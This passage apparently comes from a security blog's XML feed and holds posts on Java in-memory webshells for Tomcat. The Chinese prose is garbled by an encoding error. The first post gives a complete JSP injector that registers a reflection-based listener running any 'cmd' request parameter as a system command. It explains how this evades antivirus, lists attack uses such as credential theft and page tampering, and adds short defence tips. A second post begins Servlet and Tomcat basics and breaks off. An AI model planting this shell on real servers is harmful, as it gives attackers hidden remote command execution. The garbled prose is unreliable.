æ³•æ§åˆ¶ï¼›äºŒæ˜¯<code>applicationEventListenersList</code>ä¸­çš„Listenerï¼Œåè€…æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ã€‚åªéœ€å‘<code>applicationEventListenersList</code>ä¸­æ·»åŠ æ¶æ„Listenerï¼Œå³å¯å®ç°ç›®æ ‡ã€‚</p><p>Java Web å¼€å‘ä¸­çš„ç›‘å¬å™¨ï¼ˆListenerï¼‰å°±æ˜¯ Applicationã€Session å’Œ Request ä¸‰å¤§å¯¹è±¡åˆ›å»ºã€é”€æ¯æˆ–è€…å¾€å…¶ä¸­æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤å±æ€§æ—¶è‡ªåŠ¨æ‰§è¡Œä»£ç çš„åŠŸèƒ½ç»„ä»¶ã€‚</p><p>å’Œä¹‹å‰ Filter å‹å†…å­˜é©¬çš„åŸç†å…¶å®æ˜¯ä¸€æ ·çš„ï¼Œä¹‹å‰æˆ‘ä»¬è¯´åˆ° Filter å†…å­˜é©¬éœ€è¦å®šä¹‰ä¸€ä¸ªå®ç° Filter æ¥å£çš„ç±»ï¼ŒListener ä¹Ÿæ˜¯ä¸€æ ·</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">S</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletServletRequestListenerRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">â€‹    &#125;</span><br><span class="line">â€‹    <span class="meta">@Override</span></span><br><span class="line">â€‹    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">â€‹        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequestEvent.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">â€‹        <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">â€‹            <span class="keyword">try</span> &#123;</span><br><span class="line">â€‹                Runtime.getRuntime().exec(cmd);</span><br><span class="line">â€‹            &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">â€‹        &#125;</span><br><span class="line">â€‹    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    <span class="type">S</span> <span class="variable">servletRequestListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">S</span>();</span><br><span class="line">    standardContext.addApplicationEventListener(servletRequestListener);</span><br><span class="line">    out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><hr><h3 id="ä¸€ã€Listenerå†…å­˜é©¬æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ä¸€ã€Listenerå†…å­˜é©¬æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä¸€ã€Listenerå†…å­˜é©¬æ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>ä¸€ã€Listenerå†…å­˜é©¬æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h3><p><strong>æ¯”å–»</strong>ï¼šé“¶è¡Œçš„ <strong>ã€Œå®æ—¶è´¦ç›®ç›‘æ§ç³»ç»Ÿã€</strong>ï¼ˆListenerï¼‰è¢«é»‘å®¢æ›¿æ¢æˆå§åº•ä¼šè®¡ï¼Œæ¯å½“æœ‰èµ„é‡‘æµåŠ¨ï¼ˆäº‹ä»¶è§¦å‘ï¼‰æ—¶ï¼Œå§åº•å°±ä¼šå·å·å¤åˆ¶è´¦æœ¬ï¼ˆçªƒå–æ•°æ®ï¼‰æˆ–ç¯¡æ”¹äº¤æ˜“ï¼ˆæ‰§è¡Œæ¶æ„ä»£ç ï¼‰ã€‚  </p><p><strong>æ ¸å¿ƒç‰¹ç‚¹</strong>ï¼š<br>â€¢ <strong>æ— æ–‡ä»¶</strong>ï¼šå§åº•ä¼šè®¡æ²¡æœ‰åŠ³åŠ¨åˆåŒï¼ˆæ— .classæ–‡ä»¶ï¼‰<br>â€¢ <strong>å¯„ç”Ÿåœ¨å†…å­˜</strong>ï¼šç›´æ¥ç¯¡æ”¹é“¶è¡Œçš„ç›‘æ§ç³»ç»Ÿé…ç½®ï¼ˆStandardContextï¼‰<br>â€¢ <strong>äº‹ä»¶é©±åŠ¨</strong>ï¼šåªåœ¨ç‰¹å®šä¸šåŠ¡å‘ç”Ÿæ—¶è§¦å‘ï¼ˆå¦‚æ–°å®¢æˆ·å¼€æˆ·ã€å¤§é¢è½¬è´¦ï¼‰  </p><hr><h3 id="äºŒã€å®ç°æ­¥éª¤ï¼ˆå§åº•ä¼šè®¡æ¸—é€æµç¨‹ï¼‰"><a href="#äºŒã€å®ç°æ­¥éª¤ï¼ˆå§åº•ä¼šè®¡æ¸—é€æµç¨‹ï¼‰" class="headerlink" title="äºŒã€å®ç°æ­¥éª¤ï¼ˆå§åº•ä¼šè®¡æ¸—é€æµç¨‹ï¼‰"></a><strong>äºŒã€å®ç°æ­¥éª¤ï¼ˆå§åº•ä¼šè®¡æ¸—é€æµç¨‹ï¼‰</strong></h3><h4 id="1-æ··å…¥é“¶è¡Œæ€»éƒ¨ï¼ˆè·å–StandardContextï¼‰"><a href="#1-æ··å…¥é“¶è¡Œæ€»éƒ¨ï¼ˆè·å–StandardContextï¼‰" class="headerlink" title="1. æ··å…¥é“¶è¡Œæ€»éƒ¨ï¼ˆè·å–StandardContextï¼‰"></a><strong>1. æ··å…¥é“¶è¡Œæ€»éƒ¨ï¼ˆè·å–StandardContextï¼‰</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é€šè¿‡åå°„è·å–Tomcatçš„&quot;è´¦ç›®ç®¡ç†ä¸­å¿ƒ&quot;  </span></span><br><span class="line"><span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) contextField.get(request);  </span><br></pre></td></tr></table></figure><p><em>ç›¸å½“äºé»‘å®¢ä¹°é€šé“¶è¡Œå†…éƒ¨äººå‘˜ï¼Œæ‹¿åˆ°ç›‘æ§ç³»ç»Ÿçš„ç®¡ç†æƒé™</em>  </p><h4 id="2-åŸ¹è®­å§åº•ä¼šè®¡ï¼ˆç¼–å†™æ¶æ„Listenerï¼‰"><a href="#2-åŸ¹è®­å§åº•ä¼šè®¡ï¼ˆç¼–å†™æ¶æ„Listenerï¼‰" class="headerlink" title="2. åŸ¹è®­å§åº•ä¼šè®¡ï¼ˆç¼–å†™æ¶æ„Listenerï¼‰"></a><strong>2. åŸ¹è®­å§åº•ä¼šè®¡ï¼ˆç¼–å†™æ¶æ„Listenerï¼‰</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">        <span class="comment">// å½“æœ‰å®¢æˆ·æ¥åŠä¸šåŠ¡ï¼ˆæ”¶åˆ°HTTPè¯·æ±‚ï¼‰æ—¶  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> sre.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="comment">// å·å·æ‰§è¡Œé»‘å®¢æŒ‡ä»¤ï¼ˆå¦‚æŸ¥è´¦æˆ·ä½™é¢â†’å®é™…æ˜¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼‰  </span></span><br><span class="line">            Runtime.getRuntime().exec(cmd);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p><em>å§åº•ä¼šè®¡è¡¨é¢åœ¨åšæ­£å¸¸è´¦ç›®ç™»è®°ï¼Œå®é™…åœ¨è®°å½•æ•æ„Ÿä¿¡æ¯</em>  </p><h4 id="3-ä¼ªé€ å‘˜å·¥æ¡£æ¡ˆï¼ˆæ³¨å†ŒListeneråˆ°StandardContextï¼‰"><a href="#3-ä¼ªé€ å‘˜å·¥æ¡£æ¡ˆï¼ˆæ³¨å†ŒListeneråˆ°StandardContextï¼‰" class="headerlink" title="3. ä¼ªé€ å‘˜å·¥æ¡£æ¡ˆï¼ˆæ³¨å†ŒListeneråˆ°StandardContextï¼‰"></a><strong>3. ä¼ªé€ å‘˜å·¥æ¡£æ¡ˆï¼ˆæ³¨å†ŒListeneråˆ°StandardContextï¼‰</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºå§åº•ä¼šè®¡çš„å·¥ç‰Œ  </span></span><br><span class="line"><span class="type">EvilListener</span> <span class="variable">evilListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilListener</span>();  </span><br><span class="line"></span><br><span class="line"><span class="comment">// æŠŠå·¥ç‰Œå¡è¿›é“¶è¡Œçš„äººäº‹ç³»ç»Ÿ  </span></span><br><span class="line">standardContext.addApplicationEventListener(evilListener);  </span><br></pre></td></tr></table></figure><p><em>ç°åœ¨é“¶è¡Œçš„ç›‘æ§ç³»ç»Ÿè®¤ä¸ºè¿™æ˜¯åˆæ³•å‘˜å·¥ï¼Œä¼šå‘å…¶æ¨é€æ‰€æœ‰è´¦ç›®å˜åŠ¨</em>  </p><hr><h3 id="ä¸‰ã€ä¸ºä»€ä¹ˆèƒ½é•¿æœŸæ½œä¼ï¼Ÿ"><a href="#ä¸‰ã€ä¸ºä»€ä¹ˆèƒ½é•¿æœŸæ½œä¼ï¼Ÿ" class="headerlink" title="ä¸‰ã€ä¸ºä»€ä¹ˆèƒ½é•¿æœŸæ½œä¼ï¼Ÿ"></a><strong>ä¸‰ã€ä¸ºä»€ä¹ˆèƒ½é•¿æœŸæ½œä¼ï¼Ÿ</strong></h3><table><thead><tr><th><strong>æŠ€æœ¯æ‰‹æ®µ</strong></th><th><strong>ç°å®æ¯”å–»</strong></th><th><strong>ç»•è¿‡å®‰æ£€çš„å…³é”®</strong></th></tr></thead><tbody><tr><td><strong>å¯„ç”Ÿåœ¨StandardContext</strong></td><td>å§åº•ä¼šè®¡çš„ä¿¡æ¯ç›´æ¥å†™å…¥é“¶è¡Œæ ¸å¿ƒç³»ç»Ÿ</td><td>ä¼ ç»Ÿæ£€æŸ¥åªæŸ¥çº¸è´¨æ¡£æ¡ˆï¼Œå‘ç°ä¸äº†å†…å­˜ä¸­çš„é…ç½®</td></tr><tr><td><strong>æ— classæ–‡ä»¶è½åœ°</strong></td><td>æ²¡æœ‰åŠ³åŠ¨åˆåŒï¼Œåªæœ‰å£å¤´å…¥èŒ</td><td>æ€æ¯’è½¯ä»¶æ‰«ææ–‡ä»¶æ—¶ä¸€æ— æ‰€è·</td></tr><tr><td><strong>åˆ©ç”¨åˆæ³•äº‹ä»¶è§¦å‘</strong></td><td>åªåœ¨åŠä¸šåŠ¡æ—¶åŠ¨æ‰‹ï¼Œå¹³æ—¶ä¼ªè£…æ­£å¸¸</td><td>ç®¡ç†å‘˜å¾ˆéš¾åŒºåˆ†æ­£å¸¸è´¦ç›®æ“ä½œå’Œæ¶æ„è¡Œä¸º</td></tr></tbody></table><hr><h3 id="å››ã€å¸¸è§æ”»å‡»åœºæ™¯"><a href="#å››ã€å¸¸è§æ”»å‡»åœºæ™¯" class="headerlink" title="å››ã€å¸¸è§æ”»å‡»åœºæ™¯"></a><strong>å››ã€å¸¸è§æ”»å‡»åœºæ™¯</strong></h3><ol><li><p><strong>çªƒå–ç™»å½•å‡­è¯</strong><br>å½“ç”¨æˆ·å‘èµ·ç™»å½•è¯·æ±‚æ—¶ï¼ˆè§¦å‘ <code>ServletRequest</code> äº‹ä»¶ï¼‰ï¼Œå§åº•ä¼šè®¡è®°å½•è´¦å·å¯†ç ã€‚  </p></li><li><p><strong>å†…ç½‘æ¸—é€</strong><br>ç›‘å¬æ¯æ¬¡è¯·æ±‚ï¼Œæ£€æµ‹åˆ°ç‰¹å®šå‚æ•°ï¼ˆå¦‚ <code>?cmd=whoami</code>ï¼‰æ—¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚  </p></li><li><p><strong>æ•°æ®ç¯¡æ”¹</strong><br>åœ¨å“åº”è¿”å›å‰ï¼ˆè§¦å‘ <code>ServletResponse</code> äº‹ä»¶ï¼‰ï¼Œä¿®æ”¹é¡µé¢å†…å®¹æ’å…¥æ¶æ„JSã€‚</p></li></ol><hr><h3 id="äº”ã€é˜²å¾¡å£è¯€"><a href="#äº”ã€é˜²å¾¡å£è¯€" class="headerlink" title="äº”ã€é˜²å¾¡å£è¯€"></a><strong>äº”ã€é˜²å¾¡å£è¯€</strong></h3><blockquote><p>ğŸ” <strong>ç›‘æ§Listeneråˆ—è¡¨</strong>ï¼šå®šæœŸæ£€æŸ¥é“¶è¡Œäººäº‹ç³»ç»Ÿï¼ˆStandardContextï¼‰æ˜¯å¦æœ‰é™Œç”Ÿä¼šè®¡<br>ğŸ›¡ï¸ <strong>ç¦ç”¨é«˜å±API</strong>ï¼šç¦æ­¢ä¼šè®¡ä½¿ç”¨å¤å°æœºï¼ˆç¦æ­¢JNIè°ƒç”¨ã€åå°„ç­‰ï¼‰<br>ğŸ“œ <strong>æœ€å°åŒ–æƒé™</strong>ï¼šä¼šè®¡åªèƒ½æŸ¥çœ‹è‡ªå·±è´Ÿè´£çš„è´¦ç›®ï¼ˆæ²™ç®±ç¯å¢ƒè¿è¡ŒTomcatï¼‰  </p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tomcat-Servlet&quot;&gt;&lt;a href=&quot;#Tomcat-Servlet&quot; class=&quot;headerlink&quot; title=&quot;Tomcat-Servlet&quot;&gt;&lt;/a&gt;Tomcat-Servlet&lt;/h1&gt;&lt;p&gt;é¦–å…ˆå›é¡¾ä¸‹Tomcatä¸Servletçš„å…³ç³»</summary>
      
    
    
    
    <category term="java" scheme="https://gu0f3n.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://gu0f3n.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>javaå†…å­˜é©¬åŸºç¡€</title>
    <link href="https://gu0f3n.github.io/2025/03/28/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9F%BA%E7%A1%80/"/>
    <id>https://gu0f3n.github.io/2025/03/28/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9F%BA%E7%A1%80/</id>
    <published>2025-03-28T06:38:44.000Z</published>
    <updated>2025-03-29T10:12:19.341Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java-Web-ä¸‰å¤§ä»¶"><a href="#Java-Web-ä¸‰å¤§ä»¶" class="headerlink" title="Java Web ä¸‰å¤§ä»¶"></a>Java Web ä¸‰å¤§ä»¶</h2><p>Java Web ä¸‰å¤§ä»¶ï¼Œä¹Ÿå°±æ˜¯ Servletï¼ŒFilterï¼ŒListener</p><p>å½“ Tomcat æ¥æ”¶åˆ°è¯·æ±‚æ—¶å€™ï¼Œä¾æ¬¡ä¼šç»è¿‡ Listener -&gt; Filter -&gt; Servlet</p><h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><ul><li><a href="https://www.cnblogs.com/fwnboke/p/9119244.html">https://www.cnblogs.com/fwnboke/p/9119244.html</a></li></ul><p>è¿™é‡Œç®€å•æ€»ç»“ä¸‹</p><p>æˆ‘å°½é‡ç”¨å¤§ç™½è¯è§£é‡Šä¸€ä¸‹è¿™ä¸ªé“¾æ¥é‡Œçš„å†…å®¹ï¼š</p><ol><li><strong>Servletæ˜¯ä»€ä¹ˆ</strong>ï¼š</li></ol><ul><li>ä½ å¯ä»¥æŠŠServletç†è§£æˆâ€æœåŠ¡å‘˜â€ï¼Œä¸“é—¨å¤„ç†ç½‘ç«™çš„å„ç§è¯·æ±‚ã€‚æ¯”å¦‚ä½ ç‚¹å¤–å–ï¼ˆå‘é€è¯·æ±‚ï¼‰ï¼ŒæœåŠ¡å‘˜ï¼ˆServletï¼‰æ¥å•åå»å¨æˆ¿ï¼ˆæœåŠ¡å™¨ï¼‰åšå¥½ï¼Œå†æ‰“åŒ…ï¼ˆç”Ÿæˆç½‘é¡µï¼‰é€ç»™ä½ ã€‚</li></ul><ol><li><strong>Servletçš„å·¥ä½œåœºæ™¯</strong>ï¼š</li></ol><ul><li>åŠ¨æ€ç”Ÿæˆç½‘é¡µï¼ˆæ¯”å¦‚æ·˜å®çš„å•†å“é¡µé¢ï¼Œæ¯ä¸ªäººçœ‹åˆ°çš„éƒ½ä¸ä¸€æ ·ï¼‰</li><li>æŠŠè¯·æ±‚è½¬äº¤ç»™å…¶ä»–â€æœåŠ¡å‘˜â€å¤„ç†ï¼ˆåƒé¤å…é‡ŒæœåŠ¡å‘˜ä¹‹é—´äº¤æ¥å·¥ä½œï¼‰</li><li>è¿æ¥æ•°æ®åº“ï¼ˆæ¯”å¦‚æŸ¥ä½ çš„å¿«é€’ä¿¡æ¯ï¼‰</li><li>è¯»å–å®¢æˆ·çš„å°çº¸æ¡ï¼ˆCookieï¼‰</li></ul><ol><li><strong>å››ä¸ªé‡è¦å·¥å…·</strong>ï¼š</li></ol><ul><li><strong>è¯·æ±‚å•å­ï¼ˆHttpServletRequestï¼‰</strong>ï¼šè®°å½•å®¢æˆ·çš„æ‰€æœ‰è¦æ±‚ï¼ˆæ¯”å¦‚æœç´¢å…³é”®è¯ï¼‰</li><li><strong>å›å¤ç›’å­ï¼ˆHttpServletResponseï¼‰</strong>ï¼šç”¨æ¥æ‰“åŒ…è¦è¿”å›ç»™å®¢æˆ·çš„ä¸œè¥¿</li><li><strong>ä¸ªäººå·¥ä½œç‰Œï¼ˆServletConfigï¼‰</strong>ï¼šæ¯ä¸ªæœåŠ¡å‘˜ç‹¬æœ‰çš„é…ç½®ï¼ˆæ¯”å¦‚ä¸“å±çš„è°ƒæ–™é…æ–¹ï¼‰</li><li><strong>é¤å…å…¬å‘Šæ¿ï¼ˆServletContextï¼‰</strong>ï¼šæ‰€æœ‰æœåŠ¡å‘˜å…±äº«çš„ä¿¡æ¯ï¼ˆæ¯”å¦‚ä»Šæ—¥ç‰¹ä»·èœï¼‰</li></ul><ol><li><strong>æœåŠ¡å‘˜çš„å·¥ä½œæµç¨‹</strong>ï¼š</li></ol><ul><li>ä¸Šç­ç­¾åˆ°ï¼ˆinit()ï¼‰ï¼šç¬¬ä¸€æ¬¡è¢«å«æ—¶åšå‡†å¤‡</li><li>å¤„ç†è®¢å•ï¼ˆservice()ï¼‰ï¼šæ ¹æ®å®¢æˆ·è¦æ±‚ï¼ˆGET&#x2F;POSTï¼‰é€‰æ‹©å¤„ç†æ–¹æ³•</li><li>ä¸‹ç­æ”¶å·¥ï¼ˆdestroy()ï¼‰ï¼šå…³ç¯å…³ç…¤æ°”ï¼Œæ”¶æ‹¾ä¸œè¥¿</li></ul><ol><li><strong>ä¸¤ç§ä¸Šç­æ–¹å¼</strong>ï¼š</li></ol><ul><li>æœ‰å®¢äººå«æ‰èµ·åºŠï¼ˆé»˜è®¤ï¼‰</li><li>æå‰åˆ°å²—å¾…å‘½ï¼ˆé…ç½®load-on-startupï¼Œæ•°å­—è¶Šå°è¶Šæ—©ä¸Šç­ï¼‰</li></ul><ol><li><strong>é…ç½®å°çªé—¨</strong>ï¼š</li></ol><ul><li>æ•´ä¸ªé¤å…çš„é…ç½®ç”¨ï¼ˆæ¯”å¦‚ç»Ÿä¸€æ‰“8æŠ˜ï¼‰</li><li>ä¸ªäººé…ç½®ç”¨ï¼ˆæ¯”å¦‚æŸæœåŠ¡å‘˜ä¸“å±çš„å›´è£™é¢œè‰²ï¼‰</li><li>ç°åœ¨æµè¡Œç”¨@WebInitParamè¿™ç§è´´æ ‡ç­¾çš„æ–¹å¼é…ç½®ï¼ˆç±»ä¼¼ä¾¿åˆ©è´´ï¼‰</li></ul><ol><li><strong>å¸¸ç”¨å°åŠŸèƒ½</strong>ï¼š</li></ol><ul><li>è·å–å®¢æˆ·è¦æ±‚ï¼šrequest.getParameter()ï¼ˆæ¯”å¦‚æŸ¥å¿«é€’å•å·ï¼‰</li><li>è®¾ç½®è¿”å›æ ¼å¼ï¼šresponse.setContentType()ï¼ˆå‘Šè¯‰æµè§ˆå™¨è¿”å›çš„æ˜¯ç½‘é¡µè¿˜æ˜¯å›¾ç‰‡ï¼‰</li><li>å­˜å–ä¸´æ—¶æ•°æ®ï¼šrequest.setAttribute()ï¼ˆåƒæœåŠ¡å‘˜ä¹‹é—´ä¼ é€’å°çº¸æ¡ï¼‰</li></ul><p>ç®€å•æ¥è¯´ï¼ŒServletå°±æ˜¯ç½‘ç«™åå°çš„â€æœåŠ¡å‘˜å›¢é˜Ÿâ€ï¼Œè´Ÿè´£æ¥æ”¶ç”¨æˆ·è¯·æ±‚ã€å¤„ç†æ•°æ®ã€ç”Ÿæˆç½‘é¡µï¼Œæœ€åæŠŠç»“æœè¿”å›ç»™ç”¨æˆ·æµè§ˆå™¨çš„æ•´ä¸ªè¿‡ç¨‹ã€‚è¿™äº›æœåŠ¡å‘˜ä»¬å„å¸å…¶èŒï¼Œæœ‰çš„ä¸“é—¨å¤„ç†ç™»å½•ï¼Œæœ‰çš„ä¸“é—¨å¤„ç†æ”¯ä»˜ï¼Œå…±åŒç»´æŒç½‘ç«™çš„æ­£å¸¸è¿ä½œã€‚</p><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p><a href="https://blog.csdn.net/qq_53287512/article/details/129278148">https://blog.csdn.net/qq_53287512/article/details/129278148</a></p><p><strong>Tomcat å°±åƒæ˜¯ä¸€ä¸ªâ€œJavaç½‘ç«™æœåŠ¡å‘˜â€</strong><br>ä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆé¤å…é‡Œä¸“é—¨è´Ÿè´£æ¥å¾…é¡¾å®¢çš„æœåŠ¡å‘˜ã€‚å½“ä½ ç”¨ Java å†™äº†ä¸€ä¸ªç½‘ç«™ï¼ˆæ¯”å¦‚ä¸€ä¸ªè´­ç‰©ç½‘ç«™ï¼‰ï¼ŒTomcat çš„ä½œç”¨å°±æ˜¯ï¼š</p><ol><li><strong>æ¥ç”µè¯</strong>ï¼š<br>å½“ç”¨æˆ·ç”¨æµè§ˆå™¨è®¿é—®ä½ çš„ç½‘ç«™ï¼ˆæ¯”å¦‚è¾“å…¥ç½‘å€ï¼‰ï¼ŒTomcat ä¼šç¬¬ä¸€æ—¶é—´â€œæ¥ç”µè¯â€ï¼Œå¬æ‡‚ç”¨æˆ·æƒ³è¦ä»€ä¹ˆï¼ˆæ¯”å¦‚æ‰“å¼€é¦–é¡µã€æäº¤è®¢å•ï¼‰ã€‚</li><li><strong>å–Šå¨å¸ˆå¹²æ´»</strong>ï¼š<br>Tomcat è‡ªå·±ä¸ä¼šå¤„ç†å¤æ‚çš„ä¸šåŠ¡ï¼ˆæ¯”å¦‚è®¡ç®—ä»·æ ¼ã€æŸ¥æ•°æ®åº“ï¼‰ï¼Œä½†å®ƒä¼šå–Šä½ å†™çš„ Java ä»£ç ï¼ˆæ¯”å¦‚ Servletï¼‰æ¥å¹²æ´»ï¼Œå°±åƒæœåŠ¡å‘˜æŠŠè®¢å•ä¼ ç»™åå¨ã€‚</li><li><strong>ä¸Šèœ</strong>ï¼š<br>ç­‰ Java ä»£ç å¤„ç†å®Œæ•°æ®ï¼ŒTomcat ä¼šæŠŠç»“æœï¼ˆæ¯”å¦‚ç”Ÿæˆçš„ç½‘é¡µã€æ•°æ®ï¼‰æ‰“åŒ…å¥½ï¼Œâ€œç«¯â€å›ç»™ç”¨æˆ·çš„æµè§ˆå™¨ã€‚</li></ol><p><strong>ä¸ºä»€ä¹ˆéœ€è¦ Tomcatï¼Ÿ</strong></p><ul><li>æ²¡æœ‰å®ƒï¼Œä½ çš„ Java ä»£ç å°±åƒä¸ä¼šæ¥å®¢çš„å¨å¸ˆï¼Œç©ºæœ‰åŠŸèƒ½ä½†æ²¡äººèƒ½ç”¨ã€‚</li><li>å®ƒå¸®ä½ å¤„ç†äº†ç½‘ç»œé€šä¿¡ã€å¤šçº¿ç¨‹ç­‰å¤æ‚é—®é¢˜ï¼Œä½ åªéœ€è¦ä¸“æ³¨å†™ä¸šåŠ¡é€»è¾‘ã€‚</li></ul><p><strong>æ—¥å¸¸æ¯”å–»</strong></p><ul><li><p>å®‰è£… Tomcat â‰ˆ é›‡ä¸€ä¸ªæœåŠ¡å‘˜</p></li><li><p>éƒ¨ç½²ç½‘ç«™ â‰ˆ æŠŠèœè°±äº¤ç»™æœåŠ¡å‘˜</p></li><li><p>å¯åŠ¨ Tomcat â‰ˆ è®©æœåŠ¡å‘˜å¼€å§‹ä¸Šç­æ¥å®¢</p></li><li><p>ç«¯å£å†²çª â‰ˆ æœåŠ¡å‘˜æŠ¢äº†åˆ«äººçš„å¯¹è®²æœºé¢‘é“ï¼ˆæ¯”å¦‚é»˜è®¤ç”¨ 8080 ç«¯å£ï¼‰</p><h2 id="Tomcat-ä¸­çš„ä¸‰ä¸ª-Context-çš„ç†è§£"><a href="#Tomcat-ä¸­çš„ä¸‰ä¸ª-Context-çš„ç†è§£" class="headerlink" title="Tomcat ä¸­çš„ä¸‰ä¸ª Context çš„ç†è§£"></a>Tomcat ä¸­çš„ä¸‰ä¸ª Context çš„ç†è§£</h2><ul><li><p>Contextï¼šä»£è¡¨ä¸€ä¸ªwebåº”ç”¨ï¼Œä¸€ä¸ªåº”ç”¨å¯ä»¥æœ‰å¤šä¸ªContextï¼Œ<strong>Context å°±æ˜¯ä»£ç çš„â€œå‰§ç»„åœºè®°â€</strong> â€”â€” å®ƒè®°ä½æ‰€æœ‰ç¯å¢ƒç»†èŠ‚ï¼Œè®©æ¯ä¸ªç»„ä»¶ï¼ˆServlet&#x2F;Filterï¼‰ä¸ç”¨è‡ªå·±å¸¦å‰§æœ¬ï¼Œèµ°åˆ°å“ªéƒ½èƒ½ç«‹åˆ»å…¥æˆï¼</p><p><strong>Context å°±æ˜¯ã€Œå½“å‰ç¯å¢ƒçš„æ‰€æœ‰ä¿¡æ¯ã€</strong>ï¼Œç›¸å½“äºæ‹ç”µå½±æ—¶å¯¼æ¼”å–Šå¡åï¼Œå¯¹æ¼”å‘˜è¯´ï¼š<strong>â€œä½ åˆšåˆšæ˜¯åœ¨è¢«è¿½æ€æ—¶å–Šâ€˜å¥¥åˆ©ç»™â€™ï¼Œä¸æ˜¯åƒé¥­æ—¶å–Šçš„ï¼â€</strong> â€”â€” è¿™ä¸ªâ€œè¢«è¿½æ€â€çš„èƒŒæ™¯å°±æ˜¯ Contextã€‚</p><h3 